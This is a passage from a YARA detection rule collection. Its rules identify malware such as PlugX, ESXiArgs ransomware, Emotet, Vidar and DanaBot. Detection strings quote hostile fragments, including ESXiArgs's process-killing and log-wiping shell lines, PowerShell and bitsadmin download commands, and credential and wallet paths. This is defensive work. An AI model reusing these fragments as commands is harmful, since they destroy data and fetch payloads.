		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Malware/MALWARE_PlugX_USB_Delivery_Jun21.yar#L33-L49"
		license_url = "N/A"
		logic_hash = "1cf552c4627073d13832cf0ac602a610e0919af9e9a197aa07fef5d6a414644b"
		score = 75
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$s_shellclassinfo = "[.ShellClassInfo]" ascii
		$s_IconRes = "IconResource=C:\\Windows\\system32\\SHELL32.dll,7" ascii

	condition:
		all of ( $s_* )
}

rule SECUINFRA_MALWARE_Plugx_USB_Delivery_Ini_Recbin_Jun23
{
	meta:
		description = "Detects PlugX-style Malware delivery via removable Drives (USB) - Desktop.ini Recycle Bin; could potentially yield FPs"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "026eba63-12c1-55aa-b736-aea0494c1ab9"
		date = "2023-06-21"
		modified = "2023-06-21"
		reference = "https://unit42.paloaltonetworks.com/plugx-variants-in-usbs/"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Malware/MALWARE_PlugX_USB_Delivery_Jun21.yar#L51-L70"
		license_url = "N/A"
		logic_hash = "af5a1f20e46d9db3a9b50b5d8845e60f058c2885a560756266afbd8f3a01bf1e"
		score = 75
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$s_shellclassinfo = "[.ShellClassInfo]" ascii
		$s_IconRes = "CLSID = {645FF040-5081-101B-9F08-00AA002F954E}" ascii
		$neg_LRN = "shell32.dll,-8964" ascii

	condition:
		all of ( $s_* ) and not $neg_LRN
}

rule SECUINFRA_RANSOM_Esxiargs_Ransomware_Encryptor_Feb23
{
	meta:
		description = "Detects the ESXiArgs Ransomware 'encrypt' binary"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "e91398bd-c8b5-5702-974e-017d2c0f6054"
		date = "2023-02-07"
		modified = "2023-02-07"
		reference = "https://secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Malware/RANSOM_ESXiArgs_Ransomware_Encrypt_Feb23.yar#L1-L32"
		license_url = "N/A"
		logic_hash = "f0c9858275f547d4cf7d907377f079b817bf69cae9940b134e523bd7794d6f3b"
		score = 75
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$sosemanuk_prng = {48 8b 45 f8 48 01 45 e0 48 8b 45 f8 48 29 45 d8 48 8b 45 e8 8b 90 80 00 00 00 48 8b 45 f8 01 c2 48 8b 45 e8 89 90 80 00 00 00}
		$sosemanuk_mul_a = {00 00 00 00 13 CF 9F E1 26 37 97 6B 35 F8 08 8A [992] DE 4D 5B B5 CD 82 C4 54 F8 7A CC DE EB B5 53 3F}
		$sosemanuk_mul_ia = {00 00 00 00 CD 40 0F 18 33 80 1E 30 FE C0 11 28 [992] 1C 65 E2 9E D1 25 ED 86 2F E5 FC AE E2 A5 F3 B6}
		$interpreter = "/lib64/ld-linux-x86-64.so.2"
		$debug0 = "encrypt_bytes: too big data"
		$debug1 = "Progress: %f"
		$help = "usage: encrypt <public_key> <file_to_encrypt> [<enc_step>] [<enc_size>] [<file_size>]"

	condition:
		uint32be( 0x0 ) == 0x7F454C46 and all of ( $sosemanuk_* ) and $interpreter and 2 of ( $debug* ) and $help
}

rule SECUINFRA_RANSOM_Magniber_LNK_Jan23
{
	meta:
		description = "Detects Magniber Ransomware LNK files from fake Windows Update delivery method"
		author = "SECUINFRA Falcon Team"
		id = "2459a9e9-a6bb-50fc-9920-7632fdec7e91"
		date = "2023-01-13"
		modified = "2023-01-13"
		reference = "https://twitter.com/SI_FalconTeam/status/1613540054382559234"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Malware/RANSOM_Magniber_LNK_Jan23.yar#L1-L18"
		license_url = "N/A"
		hash = "16ecec4efa2174dec11f6a295779f905c8f593ab5cc96ae0f5249dc50469841c"
		logic_hash = "074611d74e382bb19a45b052b5b2cc186bf3667420cb1625e9bda37f2e9774c5"
		score = 75
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$netbiosName = "victim1" ascii fullword
		$macAddress = {00 0C 29 07 E1 6D}

	condition:
		uint32be( 0x0 ) == 0x4C000000 and all of them
}

rule SECUINFRA_MALWARE_Emotet_Onenote_Delivery_Wsf_Mar23
{
	meta:
		description = "Detects Microsoft OneNote files used to deliver Emotet (.wsf Payload)"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "a9201240-407d-5ca9-b7fd-37372a2e7d2a"
		date = "2023-03-16"
		modified = "2023-03-16"
		reference = "https://www.secuinfra.com/en/news/the-whale-surfaces-again-emotet-epoch4-spam-botnet-returns/"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Malware/MALWARE_Emotet_OneNote_Delivery_wsf_Mar23.yar#L1-L33"
		license_url = "N/A"
		logic_hash = "ca48f5e694b18e3f0b89b0128817848a7d36f60d8a3ada522739849bf3f7126b"
		score = 75
		quality = 45
		tags = ""
		tlp = "CLEAR"
		hash0 = "dd9fcdcaf5c26fc27863c86aa65948924f23ab9faa261562cbc9d65ac80d33d4"
		hash1 = "ca2234b9c6f7c453b91a1ca10fc7b05487f94850be7ac5ea42986347d93772d8"
		hash2 = "b75681c1f99c4caf541478cc417ee9e8fba48f9b902c45d8bda0158a61ba1a2f"
		hash3 = "7c4591fd03b73ba6d0ec71a3cf89a04bfb4bd240d359117d96834a83727bdcc2"

	strings:
		$s_protected = "This document is protected" wide
		$s_click = "You have to double-click \"View\" button to open" wide
		$s_imgFileName = "Untitled picture.jpg" wide
		$script = "language=\"VBScript\""
		$wsfExt = ".wsf" ascii wide
		$GUIDwsf = {E7 16 E3 BD 65 26 11 45 A4 C4 8D 4D 0B 7A 9E AC ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 3C 6A 6F 62 20 69 64 3D 22}
		$endTmp = /rad.{5}\.tmp/

	condition:
		uint32be( 0x0 ) == 0xE4525C7B and any of ( $s_* ) and $script and $wsfExt and $GUIDwsf and $endTmp
}

rule SECUINFRA_RANSOM_Esxiargs_Ransomware_Bash_Feb23
{
	meta:
		description = "Detects the ESXiArgs Ransomware encryption bash script"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "dafcb312-bad2-5dcc-8260-80d09e11853b"
		date = "2023-02-07"
		modified = "2023-02-07"
		reference = "https://secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Malware/RANSOM_ESXiArgs_Ransomware_Bash_Feb23.yar#L1-L45"
		license_url = "N/A"
		logic_hash = "e9838fd86e25c434f419dcc8d37a56f4f83c38930b0558181585bbfe77cd1baf"
		score = 75
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$bash = "#!/bin/sh"
		$wait = "Waiting for task' completion..."
		$comment0 = "## SSH HI"
		$comment1 = "## CHANGE CONFIG"
		$comment2 = "## STOP VMX"
		$kill0 = "echo \"KILL VMX\""
		$kill1 = "kill -9 $(ps | grep vmx | awk '{print $2}')"
		$index = "$path_to_ui/index1.html"
		$ext0 = ".vmdk"
		$ext1 = ".vmx"
		$ext2 = ".vmxf"
		$ext3 = ".vmsd"
		$ext4 = ".vmsn"
		$ext5 = ".vswp"
		$ext6 = ".vmss"
		$ext7 = ".nvram"
		$ext8 = ".vmem"
		$clean0 = "/bin/rm -f $CLEAN_DIR\"encrypt\" $CLEAN_DIR\"nohup.out\" $CLEAN_DIR\"index.html\" $CLEAN_DIR\"motd\" $CLEAN_DIR\"public.pem\" $CLEAN_DIR\"archieve.zip\""
		$clean1 = "/bin/echo '' > /etc/rc.local.d/local.sh"

	condition:
		$bash and $wait and any of ( $comment* ) and 2 of ( $kill* ) and $index and 4 of ( $ext* ) and 2 of ( $clean* )
}

rule SECUINFRA_SUS_Unsigned_APPX_MSIX_Manifest_Feb23
{
	meta:
		description = "Detects suspicious Microsoft Windows APPX/MSIX Installer Manifests"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "f24f7e03-3cc5-5214-b6d2-205b69898636"
		date = "2023-02-01"
		modified = "2023-02-07"
		reference = "https://twitter.com/SI_FalconTeam/status/1620500572481945600"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Filetypes/SUS_Unsigned_APPX_MSIX_Manifest_Feb23.yar#L1-L25"
		license_url = "N/A"
		logic_hash = "4e3de25fdad9d76cefbb191424a739368b521c4f234656c397f4122debe749fa"
		score = 65
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$xlmns = "http://schemas.microsoft.com/appx/manifest/"
		$identity = "OID.2.25.311729368913984317654407730594956997722=1"
		$s_entrypoint = "EntryPoint=\"Windows.FullTrustApplication\""
		$s_capability = "runFullTrust"
		$s_peExt = ".exe"

	condition:
		uint32be( 0x0 ) == 0x3C3F786D and $xlmns and $identity and 2 of ( $s* )
}

rule SECUINFRA_SUS_Unsigned_APPX_MSIX_Installer_Feb23
{
	meta:
		description = "Detects suspicious, unsigned Microsoft Windows APPX/MSIX Installer Packages"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "beaf08a8-a1c3-5d9c-b7cb-81a49c5bc2ec"
		date = "2023-02-01"
		modified = "2023-02-07"
		reference = "https://twitter.com/SI_FalconTeam/status/1620500572481945600"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Filetypes/SUS_Unsigned_APPX_MSIX_Installer_Feb23.yar#L1-L22"
		license_url = "N/A"
		logic_hash = "ad3f0545b2fe285adf67f053c8b422126a1bdff1b6835631280442495d975d16"
		score = 50
		quality = 30
		tags = ""
		tlp = "CLEAR"

	strings:
		$s_manifest = "AppxManifest.xml"
		$s_block = "AppxBlockMap.xml"
		$s_peExt = ".exe"
		$sig = "AppxSignature.p7x"

	condition:
		uint16be( 0x0 ) == 0x504B and 2 of ( $s* ) and not $sig
}

rule SECUINFRA_MALWARE_Onenote_Delivery_Jan23
{
	meta:
		description = "Detects suspicious Microsoft OneNote files used to deliver Malware"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "ebf02a11-6f53-573d-bd7a-9948cef9fb3a"
		date = "2023-01-19"
		modified = "2023-01-19"
		reference = "https://twitter.com/James_inthe_box/status/1615421130877329409"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Filetypes/MALWARE_OneNote_Delivery_Jan23.yar#L1-L56"
		license_url = "N/A"
		logic_hash = "08c38eedf500fd1a0224e396b41aebb8ac82b3705321ca798ac1007ea34366e1"
		score = 65
		quality = 66
		tags = ""
		tlp = "CLEAR"
		hash0 = "18af397a27e58afb901c92f37569d48e3372cf073915723e4e73d44537bcf54d"
		hash1 = "de30f2ba2d8916db5ce398ed580714e2a8e75376f31dc346b0e3c898ee0ae4cf"
		hash2 = "bfc979c0146d792283f825f99772370f6ff294dfb5b1e056943696aee9bc9f7b"
		hash3 = "e0d9f2a72d64108a93e0cfd8066c04ed8eabe2ed43b80b3f589b9b21e7f9a488"
		hash4 = "3f00a56cbf9a0e59309f395a6a0b3457c7675a657b3e091d1a9440bd17963f59"

	strings:
		$hta = "hta:application" nocase
		$script1 = "type=\"text/vbscript\""
		$script2 = "language=\"VBScript\""
		$powershell = "powershell" nocase
		$startProc = "Start-Process -Filepath"
		$webReq = "Invoke-WebRequest -Uri"
		$bitsadmin = "bitsadmin /transfer"
		$wscript = "WScript.Shell" nocase
		$autoOpen = "Sub AutoOpen()"
		$root = "GetObject(\"winmgmts:\\.\\root\\cimv2\")"
		$wsfExt = ".wsf" ascii wide
		$vbsExt = ".vbs" ascii wide
		$cmd = "cmd /c" nocase
		$batch = "@echo off"
		$batExt = ".bat" ascii wide
		$delExit = "(goto) 2>nul & del \"%~f0\"..exit /b"
		$dosString = "!This program cannot be run in DOS mode"
		$exeExt = ".exe" ascii wide
		$imageFile = "button_click-to-view-document.png" wide
		$click = "click to view document" nocase wide
		$path1 = "C:\\Users\\My\\OneDrive\\Desktop" wide
		$path2 = "C:\\Users\\Administrator\\Documents\\Dove" wide
		$path3 = "C:\\Users\\julien.galleron\\Downloads" wide

	condition:
		uint32be( 0x0 ) == 0xE4525C7B and 3 of them
}

rule SECUINFRA_OBFUS_Javascript_Wscript_Hex_Strings_Usage
{
	meta:
		description = "Detects the frequent usage of Wscript to get an hex encoded string from an array and interpret it. Used by e.g WSHRAT"
		author = "SECUINFRA Falcon Team"
		id = "dd55753e-4f7b-56be-a6d4-66f1d7dc8747"
		date = "2022-12-02"
		modified = "2022-02-13"
		reference = "https://github.com/SIFalcon/Detection"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Obfuscation/javascript_obfuscation.yar#L2-L19"
		license_url = "N/A"
		logic_hash = "62bc3261b3c2e902a82423239a7ee0bcedfccbeeeda11833b935197144dc7c35"
		score = 75
		quality = 70
		tags = ""

	strings:
		$wscript = "= WScript["
		$hex_enc_str1 = "\\x63\\x72\\x65\\x61"
		$hex_enc_str2 = "\\x73\\x63\\x72\\x69"
		$hex_enc_str3 = "\\x71\\x75\\x69\\x74"
		$hex_enc_str4 = "\\x41\\x72\\x67\\x75"

	condition:
		#wscript> 30 and 2 of ( $hex_enc_str* )
}

rule RUSSIANPANDA_Win_Mal_Koistealer_PS
{
	meta:
		description = "Detects KoiStealer PowerShell script"
		author = "RussianPanda"
		id = "6dfdb39c-1b6a-5969-9c2d-e09869af6e0f"
		date = "2024-04-04"
		modified = "2024-04-04"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/Koi/win_mal_KoiStealer_PS.yar#L1-L12"
		license_url = "N/A"
		hash = "4f55be0b55ec67dfda42b88e9c743a2a"
		logic_hash = "8a60a1d770eb4b5048762ddfd4657fdf7a430b09eb454ae5a5bb3103460907db"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "index.php?id=$guid&subid="
		$s2 = "$config"

	condition:
		all of ( $s* )
}

rule RUSSIANPANDA_Andeloader
{
	meta:
		description = "Detects Ande Loader"
		author = "RussianPanda"
		id = "c08d63b6-9fef-505d-9611-9dd0403c7c7c"
		date = "2023-12-11"
		modified = "2023-12-11"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/AndeLoader/ande_loader.yar#L3-L18"
		license_url = "N/A"
		logic_hash = "cd55153077e5cfbd84cbe5b062dbd842def245417acfea4ed6c2b1db702dcc81"
		score = 75
		quality = 83
		tags = ""

	strings:
		$s1 = {59 61 6E 6F 41 74 74 72 69 62 75 74 65}
		$s2 = "CreateShortcut" wide
		$s3 = ".vbs" wide

	condition:
		3 of ( $s* ) and pe.imports ( "mscoree.dll" )
}

rule RUSSIANPANDA_Mal_Fenixbotnet_Jse
{
	meta:
		description = "Detects Fenix Botnet JSE downloader"
		author = "RussianPanda"
		id = "00c6f8a6-c2e2-5b08-b332-b91371060bbe"
		date = "2024-01-18"
		modified = "2024-02-02"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/FenixBotnet/mal_FenixBotnet_jse.yar#L1-L14"
		license_url = "N/A"
		hash = "a7fadf0050d4d0b2cefd808e16dfde69"
		logic_hash = "848c00361fba60e63e8ec4098404e87d4ba2b11d8489ad16d49c20fc653a5e45"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = {76 61 72 20 [0-30] 3D 20 22 66 22}
		$s2 = {76 61 72 20 [0-30] 3D 20 22 75 22}
		$s3 = {76 61 72 20 [0-30] 3D 20 22 6E 22}
		$s4 = {6E 65 77 20 46 75 6E 63 74 69 6F 6E 28 64 65 63 6F 64 65 55 52 49 43 6F 6D 70 6F 6E 65 6E 74 28 [0-30] 29 29 2E 63 61 6C 6C 28 29}

	condition:
		all of ( $s* )
}

rule RUSSIANPANDA_Darkgate_Autoit
{
	meta:
		description = "Detects DarkGate AutoIT script"
		author = "RussianPanda"
		id = "b30544b5-88c9-5a84-8582-f4f72b228f24"
		date = "2024-01-26"
		modified = "2024-01-26"
		reference = "https://yara.readthedocs.io/en/stable/writingrules.html?highlight=xor"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/DarkGate/darkgate_autoit.yar#L1-L19"
		license_url = "N/A"
		hash = "e1803b01e3f187355dbeb87a0c91b76c"
		logic_hash = "dda6726d09035d6f61ca331d18ed37f032c6f6a5ab88e1754a21587f4c79ac87"
		score = 75
		quality = 85
		tags = ""

	strings:
		$h = "AU3!EA06"
		$s1 = "just_test.txt" xor(0x01-0xff)
		$s2 = "c:\\temp\\data.txt" xor(0x01-0xff)
		$s3 = "test.txt" xor(0x01-0xff)
		$s4 = "cc.txt" xor(0x01-0xff)
		$s5 = "c:\\temp\\data.txt" xor(0x01-0xff)
		$s6 = "uu.txt" xor(0x01-0xff)

	condition:
		3 of ( $s* ) and $h
}

rule RUSSIANPANDA_Swaetrat
{
	meta:
		description = "Detects SwaetRAT"
		author = "RussianPanda"
		id = "e5238ae4-7ae3-505c-a3fd-ecf6be608fac"
		date = "2023-11-27"
		modified = "2023-11-27"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/SwaetRAT/swaetrat.yar#L3-L19"
		license_url = "N/A"
		logic_hash = "4dc1107a34d678c3fa0939fab7986fe744ac246400823d08b1ab6db0942821da"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "Pong"
		$s3 = "ReadData"
		$s4 = "DeskDrop" wide
		$s5 = "OfflineGet" wide

	condition:
		all of ( $s* ) and pe.imports ( "mscoree.dll" )
}

rule RUSSIANPANDA_Metastealer
{
	meta:
		description = "Detects the old version of MetaStealer 11-2023"
		author = "RussianPanda"
		id = "c178630b-d188-5faf-86b3-436894241d77"
		date = "2023-11-16"
		modified = "2023-12-30"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/MetaStealer/metastealer.yar#L2-L19"
		license_url = "N/A"
		logic_hash = "f78b376713daf82aa2e0cbd6bf45f33d25530449fa05673c8a7c6b4c0dddca79"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "FileScannerRule"
		$s2 = "MSObject"
		$s3 = "MSValue"
		$s4 = "GetBrowsers"
		$s5 = "Biohazard"

	condition:
		4 of ( $s* ) and pe.imports ( "mscoree.dll" )
}

rule RUSSIANPANDA_Metastealer_Core_Payload
{
	meta:
		description = "Detects MetaStealer Core Payload"
		author = "RussianPanda"
		id = "ff5854b5-4dac-59d7-8c5a-d5b808d63483"
		date = "2023-12-29"
		modified = "2023-12-29"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/MetaStealer/metastealer_core_payload_12-2023.yar#L2-L19"
		license_url = "N/A"
		logic_hash = "99a319023f2c1b714a70458bd33649d6cc343b500a409af12c2eb1ce38ba4241"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "FileScannerRule"
		$s2 = "TreeObject"
		$s3 = "Schema"
		$s4 = "StringDecrypt"
		$s5 = "AccountDetails"

	condition:
		4 of ( $s* ) and pe.imports ( "mscoree.dll" )
}

rule RUSSIANPANDA_Win_Sus_Internetshortcutfile
{
	meta:
		description = "Detects suspicious Internet Shortcut Files that are often used to retrieve malware"
		author = "RussianPanda"
		id = "88d5d33f-0342-5575-b5e4-31ac5695abf2"
		date = "2024-02-17"
		modified = "2024-02-17"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/Techniques/win_sus_InternetShortcutFile.yar#L1-L19"
		license_url = "N/A"
		logic_hash = "9ec321ba521949fcc1db09b843913424182bfbb14eac61e92b7132d88b275ceb"
		score = 65
		quality = 58
		tags = ""

	strings:
		$s1 = "[InternetShortcut]"
		$s2 = {55 52 4C 3D 66 69 6C 65 3A 2F 2F}
		$a1 = ".exe"
		$a2 = ".dll"
		$a3 = ".js"
		$a4 = ".msi"
		$a5 = ".msix"
		$a6 = ".bat"
		$a7 = ".cmd"

	condition:
		all of ( $s* ) and any of ( $a* )
}

rule RUSSIANPANDA_Danabot
{
	meta:
		description = "Detects DanaBot"
		author = "RussianPanda"
		id = "804604d9-db3b-5678-ae0d-67f0e876c93e"
		date = "2023-12-01"
		modified = "2023-12-01"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/DanaBot/danabot_yara.yar#L1-L17"
		license_url = "N/A"
		logic_hash = "4968531f27fa1a8bc3fca536a04b75277adefc42addb9f1999c564510cbcb684"
		score = 75
		quality = 83
		tags = ""

	strings:
		$s1 = {55 8b ec 8a 45 08 34 4a 5d c2 04 00}
		$s2 = {4D 00 6F 00 7A 00 69 00 6C 00 6C 00 61 00 5C 00 53 00 65 00 61 00 4D 00 6F 00 6E 00 6B 00 65 00 79}
		$s3 = {4D 00 6F 00 7A 00 69 00 6C 00 6C 00 61 00 20 00 54 00 68 00 75 00 6E 00 64 00 65 00 72 00 62 00 69 00 72 00 64 00}
		$s4 = {53 00 6F 00 66 00 74 00 77 00 61 00 72 00 65 00 5C 00 4F 00 52 00 4C 00 5C 00 57 00 69 00 6E 00 56 00 4E 00 43 00 33 00 5C 00 50 00 61 00 73 00 73 00 77 00 6F 00 72 00 64}
		$s5 = {53 00 6F 00 66 00 74 00 77 00 61 00 72 00 65 00 5C 00 45 00 78 00 63 00 69 00 74 00 65 00 5C 00 50 00 72 00 69 00 76 00 61 00 74 00 65 00 4D 00 65 00 73 00 73 00 65 00 6E 00 67 00 65 00 72 00 5C 00 50 00 61 00 73 00 73 00 77 00 6F 00 72 00 64}
		$a = {44 45 4C 50 48 49 43 4C 41 53 53}

	condition:
		3 of ( $s* ) and $a
}

rule RUSSIANPANDA_Vidar_DLL_Embedded
{
	meta:
		description = "Vidar Stealer with embedded DLL dependencies"
		author = "RussianPanda"
		id = "462fe42a-2504-5e7e-ad90-2c7e54478204"
		date = "2023-05-02"
		modified = "2023-05-05"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/VidarStealer/vidar_ver3.6_3.7_dll_embedded.yar#L1-L21"
		license_url = "N/A"
		logic_hash = "98d23523c2ab196f670dc33164954fc69a1c1692fa870a476e25d7dd3cebace2"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s = {50 4B 03 04 14 00 00 00 08 00 24 56 25 55 2B 6D 5C 08 39 7C 05}
		$a1 = "https://t.me/mastersbots"
		$a2 = "https://steamcommunity.com/profiles/76561199501059503"
		$a3 = "%s\\%s\\Local Storage\\leveldb"
		$a4 = "\\Autofill\\%s_%s.txt"
		$a5 = "\\Downloads\\%s_%s.txt"
		$a6 = "\\CC\\%s_%s.txt"
		$a7 = "Exodus\\exodus.wallet"

	condition:
		$s and 5 of ( $a* )
}

rule RUSSIANPANDA_Sentinel_Stealer
{
	meta:
		description = "Detects Sentinel Stealer"
		author = "RussianPanda"
		id = "8a221d7b-8fa6-53cd-a3e8-63cc67285186"
		date = "2024-01-19"
		modified = "2024-01-19"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/SentinelStealer/sentinel_stealer.yar#L1-L14"
		license_url = "N/A"
		hash = "3a540a8a81c5a5b452f154d7875423a3"
		logic_hash = "b9d72848842ea4d26544633bb83fccd17239b28493bde3f73341eb2004d8ee0c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Sentinel.SmallerEncryptedIcon" wide
		$s2 = "SentinelSteals" wide
		$s4 = "_CorExeMain"

	condition:
		all of them
}

rule RUSSIANPANDA_Solardropper
{
	meta:
		description = "SolarMarker first stage detection"
		author = "RussianPanda"
		id = "8e40b001-ae00-5768-bb91-e45264748087"
		date = "2024-01-03"
		modified = "2024-01-03"
		reference = "https://www.esentire.com/blog/solarmarker-to-jupyter-and-back"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/SolarMarker/solardropper.yar#L1-L15"
		license_url = "N/A"
		logic_hash = "5dccb7be94e814335c0c867f8b3dd8855043375fe9f1235d5519c690fc7df842"
		score = 75
		quality = 85
		tags = ""

	strings:
		$p1 = {2d 00 71 00 71 00 78 00 74 00 72 00 61 00 63 00 74 00 3a 00 22 00 3c 00 66 00 69 00 6c 00 71 00 71 00 6e 00 61 00 6d 00 71 00 71 00 3e 00 22 00}
		$p2 = "deimos.exe"
		$p3 = {5e 00 2d 00 28 00 5b 00 5e 00 3a 00 20 00 5d 00 2b 00 29 00 5b 00 20 00 3a 00 5d 00 3f 00 28 00 5b 00 5e 00 3a 00 5d 00 2a 00 29 00 24 00}

	condition:
		all of ( $p* )
}

rule RUSSIANPANDA_Obfuscation_Powershell_Special_Chars
{
	meta:
		description = "Detects PowerShell special character obfuscation"
		author = "RussianPanda"
		id = "dd2d41d4-3431-5252-adf1-d537f3b8db7e"
		date = "2024-01-12"
		modified = "2024-02-02"
		reference = "https://perl-users.jp/articles/advent-calendar/2010/sym/11"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/PowerShell Obfuscation/obfuscation_powershell_special_chars.yar#L1-L15"
		license_url = "N/A"
		hash = "d77efad78ef3afc5426432597ba129141952719846bc5ccd058249bb23d8a905"
		logic_hash = "4cc4ebffe7bf712b412a060536acc51d94381d24b46e5494195ae17482076cd6"
		score = 75
		quality = 81
		tags = ""

	strings:
		$s1 = {7d 3d 2b 2b 24 7b}
		$s2 = {24 28 20 20 29}
		$s3 = {24 7B [1-10] 7D 20 20 2B 20 20 24}
		$s4 = {24 7B [1-10] 7D 24 7B}

	condition:
		2 of ( $s* )
}

rule RUSSIANPANDA_Aurorastealer_1
{
	meta:
		description = "Detects the Build/Group IDs if present / detects an unobfuscated AuroraStealer binary; tested on version 22.12.2022"
		author = "RussianPanda"
		id = "1a94096f-c838-5272-856e-42efbd123a31"
		date = "2023-02-07"
		modified = "2023-05-05"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/AuroraStealer/AuroraStealer.yar#L1-L16"
		license_url = "N/A"
		logic_hash = "7a9900266a0dfa7bf0ea91a0260a1d30bd7799a491fba87db083f4fea4115f2a"
		score = 50
		quality = 85
		tags = ""

	strings:
		$b1 = { 48 8D 0D ?? ?? 04 00 E8 ?? ?? EF FF }
		$go = "Go build ID"
		$machineid = "MachineGuid"

	condition:
		all of them
}

rule RUSSIANPANDA_Aurorastealer_March_2023
{
	meta:
		description = "Detects an unobfuscated AuroraStealer March update binary"
		author = "RussianPanda"
		id = "a115de7a-bff7-5bb0-b83f-f66a29bbcf3f"
		date = "2023-03-23"
		modified = "2023-05-05"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/AuroraStealer/Aurora_March_2023.yar#L1-L15"
		license_url = "N/A"
		logic_hash = "d74d2843a03e826f334ce3c5eb10cc2b43cfd832174769e5d067fb877abe13a0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$b1 = { 48 8D 0D ?? ?? 05 00 E8 ?? ?? EF FF }
		$ftp = "FOUND FTP"

	condition:
		all of them
}

rule RUSSIANPANDA_Fakebat_Powershell
{
	meta:
		description = "Detects FakeBat PowerShell scripts"
		author = "RussianPanda"
		id = "76149a6f-c370-5e48-82cc-c89b545c0aa8"
		date = "2023-12-01"
		modified = "2023-12-01"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/FakeBat/fakebat_powershell.yar#L1-L13"
		license_url = "N/A"
		logic_hash = "df6b30d97ac6c9b248fed0d901e8a0a6ad1d855483a5006b008b839d9961092a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "$LoadDomen/?status=start&av=" nocase
		$s2 = "$xxx.gpg" nocase

	condition:
		all of ( $s* )
}

rule CHECK_POINT_Apt_Nazar_Component_Guids
{
	meta:
		description = "Detect Nazar Components by COM Objects' GUID"
		author = "Itay Cohen"
